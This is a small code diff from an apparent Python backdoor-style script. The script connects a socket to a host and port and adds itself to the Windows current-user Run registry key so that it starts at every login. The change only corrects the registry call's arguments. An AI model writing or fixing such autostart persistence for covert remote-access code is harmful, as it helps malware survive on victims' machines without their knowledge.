@@ -18,7 +18,7 @@ s.connect((HOST, PORT))
 
 def addToReg():
     reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)
-    winreg.SetValue(reg_key, "my_reg", 0, winreg.REG_SZ, __file__)
+    winreg.SetValue(reg_key, "my_reg", winreg.REG_SZ, __file__)
 
 def main():
     addToReg()
